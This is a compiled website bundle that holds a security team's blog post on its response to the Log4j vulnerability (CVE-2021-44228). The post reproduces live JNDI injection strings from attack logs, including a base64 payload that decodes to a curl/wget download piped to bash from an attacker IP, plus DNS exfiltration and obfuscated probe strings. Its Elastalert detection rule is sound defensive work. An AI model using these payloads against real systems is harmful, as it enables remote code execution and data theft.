"use strict";(self.webpackChunkworking_group_two_website=self.webpackChunkworking_group_two_website||[]).push([[5801],{4137:function(e,t,a){a.d(t,{Zo:function(){return u},kt:function(){return h}});var n=a(7294);function r(e,t,a){return t in e?Object.defineProperty(e,t,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[t]=a,e}function o(e,t){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),a.push.apply(a,n)}return a}function i(e){for(var t=1;t<arguments.length;t++){var a=null!=arguments[t]?arguments[t]:{};t%2?o(Object(a),!0).forEach((function(t){r(e,t,a[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):o(Object(a)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(a,t))}))}return e}function s(e,t){if(null==e)return{};var a,n,r=function(e,t){if(null==e)return{};var a,n,r={},o=Object.keys(e);for(n=0;n<o.length;n++)a=o[n],t.indexOf(a)>=0||(r[a]=e[a]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)a=o[n],t.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(r[a]=e[a])}return r}var l=n.createContext({}),c=function(e){var t=n.useContext(l),a=t;return e&&(a="function"==typeof e?e(t):i(i({},t),e)),a},u=function(e){var t=c(e.components);return n.createElement(l.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},p=n.forwardRef((function(e,t){var a=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),p=c(a),h=r,m=p["".concat(l,".").concat(h)]||p[h]||d[h]||o;return a?n.createElement(m,i(i({ref:t},u),{},{components:a})):n.createElement(m,i({ref:t},u))}));function h(e,t){var a=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=a.length,i=new Array(o);i[0]=p;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,i[1]=s;for(var c=2;c<o;c++)i[c]=a[c];return n.createElement.apply(null,i)}return n.createElement.apply(null,a)}p.displayName="MDXCreateElement"},1071:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},assets:function(){return u},toc:function(){return d},default:function(){return h}});var n=a(7462),r=a(3366),o=(a(7294),a(4137)),i=["components"],s={slug:"log4j-security-vulnerability",title:"Zero-day vulnerabilities - Log4j",date:new Date("2021-12-17T00:00:00.000Z"),tags:["security","infrastructure","vulnerability"],author:"Jonnathan Griffin & Yan Grunenberger",author_title:"Security",author_url:"https://www.linkedin.com/in/jonnathangriffin/",author_image_url:"https://media-exp1.licdn.com/dms/image/C4E03AQEjrF7PC8veoQ/profile-displayphoto-shrink_400_400/0/1624522450808?e=1648684800&v=beta&t=LZVAsE5hVp3T50zGPk0qkf8qPJCnsXBlBXfCosrTH5o"},l=void 0,c={permalink:"/blog/log4j-security-vulnerability",editUrl:"https://github.com/jonny-wg2/website3.0/edit/main/blog/../blog/2021-12-17-log4j-security-vulnerability.md",source:"@site/../blog/2021-12-17-log4j-security-vulnerability.md",title:"Zero-day vulnerabilities - Log4j",description:"On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as \u201cLog4Shell\u201d in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.",date:"2021-12-17T00:00:00.000Z",formattedDate:"December 17, 2021",tags:[{label:"security",permalink:"/blog/tags/security"},{label:"infrastructure",permalink:"/blog/tags/infrastructure"},{label:"vulnerability",permalink:"/blog/tags/vulnerability"}],readingTime:10.16,truncated:!0,authors:[{name:"Jonnathan Griffin & Yan Grunenberger",title:"Security",url:"https://www.linkedin.com/in/jonnathangriffin/",imageURL:"https://media-exp1.licdn.com/dms/image/C4E03AQEjrF7PC8veoQ/profile-displayphoto-shrink_400_400/0/1624522450808?e=1648684800&v=beta&t=LZVAsE5hVp3T50zGPk0qkf8qPJCnsXBlBXfCosrTH5o"}],prevItem:{title:"The specs behind the specs part 1",permalink:"/blog/the-specs-behind-the-specs-part-1"},nextItem:{title:"CKH IOD selects Working Group Two for public cloud core network",permalink:"/blog/ckh-iod-wg2-public-cloud"}},u={authorsImageUrls:[void 0]},d=[{value:"Code",id:"code",children:[],level:2},{value:"Docker Vulnerability Scan Day 1",id:"docker-vulnerability-scan-day-1",children:[],level:2},{value:"Checking our infrastructure ourselves with DNS requests",id:"checking-our-infrastructure-ourselves-with-dns-requests",children:[],level:2},{value:"Log Analysis and Alerting",id:"log-analysis-and-alerting",children:[],level:2},{value:"Docker Vulnerability Scans",id:"docker-vulnerability-scans",children:[],level:2},{value:"Monitoring Vendors",id:"monitoring-vendors",children:[],level:2}],p={toc:d};function h(e){var t=e.components,s=(0,r.Z)(e,i);return(0,o.kt)("wrapper",(0,n.Z)({},p,s,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"On Friday, December 10th, ",(0,o.kt)("strong",{parentName:"p"},"wgtwo")," and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as \u201cLog4Shell\u201d in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation. "),(0,o.kt)("h1",{id:"table-of-contents"},"Table of Contents"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"#friday"},"Friday")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"#code"},"Code"),"  "),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"#docker-vulnerability-scan-day-1"},"Docker Vulnerability Scan Day 1"),"  ")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"#saturday"},"Saturday")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"#checking-our-infrastructure-ourselves-with-DNS-requests"},"Checking our infrastructure ourselves with DNS requests"),"  "),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"#log-analysis-and-alerting"},"Log Analysis and Alerting"),"  ")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"#monday"},"Monday")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"#docker-vulnerability-scans"},"Docker Vulnerability Scans"),"  "),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"#monitoring-vendors"},"Monitoring vendors"),"  ")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"#what-worked-well-and-could-be-improved"},"What worked well and could be improved"),(0,o.kt)("br",{parentName:"p"}),"\n",(0,o.kt)("a",{parentName:"p",href:"#staying-secure"},"Staying secure"),(0,o.kt)("br",{parentName:"p"}),"\n",(0,o.kt)("a",{parentName:"p",href:"#we-are-hiring"},"We are hiring"),"  "),(0,o.kt)("h1",{id:"friday"},"Friday"),(0,o.kt)("p",null,"Mitigating 3rd party vulnerabilities is an ability that ",(0,o.kt)("strong",{parentName:"p"},"wgtwo")," has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture. "),(0,o.kt)("p",null,"We knew that all versions of Log4j ",(0,o.kt)("inlineCode",{parentName:"p"},"2.0-beta9 <= Apache log4j <= 2.14.1")," were affected. "),(0,o.kt)("h2",{id:"code"},"Code"),(0,o.kt)("p",null,"Naturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely."),(0,o.kt)("h2",{id:"docker-vulnerability-scan-day-1"},"Docker Vulnerability Scan Day 1"),(0,o.kt)("p",null,"We use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry. "),(0,o.kt)("p",null,"At a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy\u2019s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified. "),(0,o.kt)("h1",{id:"saturday"},"Saturday"),(0,o.kt)("h2",{id:"checking-our-infrastructure-ourselves-with-dns-requests"},"Checking our infrastructure ourselves with DNS requests"),(0,o.kt)("p",null,"At that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j."),(0,o.kt)("p",null,"One harmless way to detect vulnerability is to exercise the JNDI resolver, that is to say, to have log4j perform the DNS request toward the java object. Thinkst folks are providing Canary Tokens service in a free tier fashion, and inside, there is a DNS token:"),(0,o.kt)("p",null,(0,o.kt)("img",{src:a(3755).Z})),(0,o.kt)("p",null,"If a DNS resolution is performed on the unique DNS hostname, we would get a callback or an email. After generating the token, we quickly proceed to probe our infrastructure:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'curl https://docs.wgtwo.com  -A "\\${jndi:ldap://randomlygeneratedhostname.canarytokens.com/a}"\n')),(0,o.kt)("p",null,"After executing the command, we shortly received the notification from CanaryTokens. It means one of our elements of the infrastructure stack is relying on log4j. Nevertheless, we need to assess if the vulnerability is exploitable, so we check the Infosec literature."),(0,o.kt)("p",null,"JNDI stands for Java Naming and Directory Interface - it is a system designed to look up for data and resources, i.e. such as Java bytecode. It might sound wrong to the 2021 engineers but back in 2000 Java RMI, CORBA etc were very trendy concepts for discovering and executing code in a dynamic fashion - think like Javascript or ActiveX applets in the browser world. "),(0,o.kt)("p",null,"Going back to our problem, we quickly found this ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/veracode-research/rogue-jndi"},"Rogue JNDI"),". This is basically an exploit generator that creates a fake LDAP server, replying with Java class objects that will be executed by log4j on object retrieval.  After building a quick docker image, we ran this exploit on an external host and execute several calls to check all the proposed types of payload:"),(0,o.kt)("p",null,(0,o.kt)("img",{src:a(2233).Z})),(0,o.kt)("p",null,"In particular, RemoteReference did not yield to any execution, which means probably the JVM used to run the affected Java component is either too recent or not configured to execute code via known remote methods. This gives us some time, but we are still exposed to information leakage as an attacker can still exfiltrate env variables via DNS queries - i.e. log4j would resolve environment variables and would embed them in a query, such as: "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"${jndi:ldap://${env:JAVA_VERSION}.dnsresolver.foo}\n")),(0,o.kt)("p",null,"Then, we should proceed to:\n1) Identify if the affected components are in our stack or in the cloud provider\n2) Apply mitigation  "),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Either via WAF - firewall rules on traffic.   "),(0,o.kt)("li",{parentName:"ul"},"Either via known mitigation on the log4g components",(0,o.kt)("ul",{parentName:"li"},(0,o.kt)("li",{parentName:"ul"},"Environment variable / JVM options"),(0,o.kt)("li",{parentName:"ul"},"Java class removal"),(0,o.kt)("li",{parentName:"ul"},"Full component upgrade")))),(0,o.kt)("p",null,"For (1), we started to observe all our log components and run network monitoring for a specific TCP flow on a controlled external host (i.e. running tcpdump toward a specific IP/port). We quickly noticed that a pod for one of DaemonSet was the culprit. This component was embedding logstash which is using Java and log4j. "),(0,o.kt)("p",null,"Assuming this was the only element, we proceed to apply mitigation:\nWe discard the WAF approach as too complex and not providing enough coverage. We indeed saw later obfuscation of the ",(0,o.kt)("inlineCode",{parentName:"p"},"jndi:ldap")," string used to trigger the vulnerability.\nThe environment variable / JVM options were the quickest to deploy, but yielded no result. Later on, the Elastic Log4j CVE dedicated page mentioned that the mitigation was ineffective.\nJava class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component."),(0,o.kt)("h2",{id:"log-analysis-and-alerting"},"Log Analysis and Alerting"),(0,o.kt)("p",null,"Just after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. ",(0,o.kt)("inlineCode",{parentName:"p"},"${jndi")),(0,o.kt)("p",null,"Cloudflare wrote a great ",(0,o.kt)("a",{parentName:"p",href:"https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/"},"blog post")," about the traffic they have seen when updating their firewall rules for preventing Log4j exploits."),(0,o.kt)("p",null,"For us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by ",(0,o.kt)("a",{parentName:"p",href:"https://aws.amazon.com/security/security-bulletins/AWS-2021-006/"},"AWS Security Bulletin"),". "),(0,o.kt)("p",null,"To get some ChatOps alerts in slack we use an open-source tool called ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/Yelp/elastalert"},"Elstalert"),". This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure. "),(0,o.kt)("p",null,"To get started, we built the following Elastalert rule:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-yaml"},'log4j.yaml: |-\n  ---\n  name: "log4j cve"\n  index: logstash-*\n  type: any\n  realert:\n    minutes: 15\n  filter:\n  - query:\n    - query_string:\n        query: "\\"jndi:ldap\\""\n  query_delay:\n    minutes: 5\n  query_key: "message"\n  alert_text_type: alert_text_only\n  include : ["kubernetes.container.name","message"]\n  alert:\n  - "slack"\n  alert_text: "\n  *Container* : {0}\\n\n  *Message* : {1}"\n  alert_text_args: ["kubernetes.container.name","message"]\n  slack_channel_override: "#cve-2021-44228"\n  slack_emoji_override: ":unlock:"\n  slack_msg_color: warning\n  slack_title: Security RCE attempt for CVE-2021-44228\n')),(0,o.kt)("p",null,"We quickly then began to receive alerts of probing attempts across our environments."),(0,o.kt)("p",null,(0,o.kt)("img",{src:a(132).Z})),(0,o.kt)("p",null,"The following alerts are ",(0,o.kt)("strong",{parentName:"p"},"unsuccessful")," exploit attempts our infrastructure."),(0,o.kt)("p",null,"Let\u2019s take a closer look at some of these exploit attempts to see if we can learn anything.."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'[2021-12-10T14:05:52.612 Z] "GET / HTTP/1.1" 307 - 0 0 0 - "45.155.205.233" "${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}" "34b61b2d-28f6-4e89-9baf-7cd3b4e71698" "54.217.173.83:443" "-"\n')),(0,o.kt)("p",null,"This request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:"),(0,o.kt)("p",null,"base64 "),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==\n")),(0,o.kt)("p",null,"base64 decoded"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash\n")),(0,o.kt)("p",null,"If this attack was successful, we can see that the actor is attempting to download a malicious exploit first with ",(0,o.kt)("inlineCode",{parentName:"p"},"curl"),", then attempt with ",(0,o.kt)("inlineCode",{parentName:"p"},"wget")," and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/falcosecurity/falco"},"Falco"),". In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack."),(0,o.kt)("p",null,"Looking at more attempts, we started to see probing attempts using a 3rd party service using ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/projectdiscovery/interactsh"},"Interactsh"),"."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'16/Dec/2021:06:11:07 +0000] "GET /?x=${jndi:ldap://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1" 302 0 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}" 685 0.015 [products-developer-portal-8080] 100.98.133.224:8080 0 0.014 302 548d1132926fa0bc9904e12523d2f250 [${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}, 173.249.19.100]\n')),(0,o.kt)("p",null,"We see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'[2021-12-14T22:57:36.722Z] "GET / HTTP/1.1" 307 - 0 0 0 - "51.105.55.17" "/${jndi:ldap://45.83.193.150:1389/Exploit}" "7c9223d6-2c81-491d-8564-10742cc90a9c" "54.75.196.220" "-"\n')),(0,o.kt)("p",null,"In our Tokyo region, we started to see a lot of requests from ",(0,o.kt)("inlineCode",{parentName:"p"},"x00.it")," domain."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'[14/Dec/2021:17:37:59 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1" 401 39 "${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_Referer.log4jdns.x00.it/}" "${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}" 4496 0.255 [monitoring-mki-lab-grafana-80] 100.115.164.63:3000 39 0.001 401 d7fa702ee8cc73793707ca6720c57639 [194.5.73.6]\n')),(0,o.kt)("p",null,"In the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve."),(0,o.kt)("h1",{id:"monday"},"Monday"),(0,o.kt)("h2",{id:"docker-vulnerability-scans"},"Docker Vulnerability Scans"),(0,o.kt)("p",null,"Next, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/cisagov/log4j-affected-db"},"this resource")," that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/kubernetes/kubectl"},"kubectl")," and ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/aquasecurity/trivy"},"Trivy"),", a scanner for vulnerabilities in container images."),(0,o.kt)("p",null,"First, we built a small POC to ensure that Trivy can identify the CVE-2021-44228."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"\u276f\u276f\u276f brew install aquasecurity/trivy/trivy\n\u276f\u276f\u276f trivy image birdyman/log4j2-demo:1.0.0-12 | grep CVE-2021-44228 \n| org.apache.logging.log4j:log4j-api                     | CVE-2021-44228   | CRITICAL | 2.10.0            | 2.15.0                         | Remote code injection in Log4j                                                  |\n")),(0,o.kt)("p",null,"Now that we know Trivy works, let\u2019s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE."),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"trivy-scan-cve.sh CVE-2021-44228")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'#!/usr/bin/env bash\n\nVULN=$1\n\necho "Scanning $1..."\n\nimgs=`kubectl get pods -A -o jsonpath=\'{range .items[*]}{.spec.containers[*].image}{" "}\' | tr " " "\\n" | sort -u`\nfor img in ${imgs}; do\n  echo "scanning ${img}"\n  result=`trivy image --severity CRITICAL ${img}`\n  if echo ${result} | grep -q "$1" ; then\n    echo -e "${img} is vulnerable, please patch!"\n  fi\ndone\n')),(0,o.kt)("p",null,"We ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods."),(0,o.kt)("h2",{id:"monitoring-vendors"},"Monitoring Vendors"),(0,o.kt)("p",null,"It is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required."),(0,o.kt)("h1",{id:"what-worked-well-and-could-be-improved"},"What worked well and could be improved"),(0,o.kt)("p",null,"During this incident management we have gathered great learnings in the way. "),(0,o.kt)("p",null,"First of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process. "),(0,o.kt)("p",null,"Second, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry."),(0,o.kt)("h1",{id:"staying-secure"},"Staying secure"),(0,o.kt)("p",null,"All in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment. "),(0,o.kt)("h1",{id:"we-are-hiring"},"We are hiring"),(0,o.kt)("p",null,"If you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi. ",(0,o.kt)("a",{parentName:"p",href:"https://wgtwo.jobs.personio.de/job/423396?display=en"},"https://wgtwo.jobs.personio.de/job/423396?display=en")))}h.isMDXComponent=!0},3755:function(e,t,a){t.Z=a.p+"assets/images/01-canary-tokens-f983dacab054f367bad1da172173f916.png"},2233:function(e,t,a){t.Z=a.p+"assets/images/02-supported-payloads-a00c9b2b8c1fbe6da7493e687868530a.png"},132:function(e,t,a){t.Z=a.p+"assets/images/03-elastalert-b2d2c5d0c28cf3f09e30feb948e60320.png"}}]);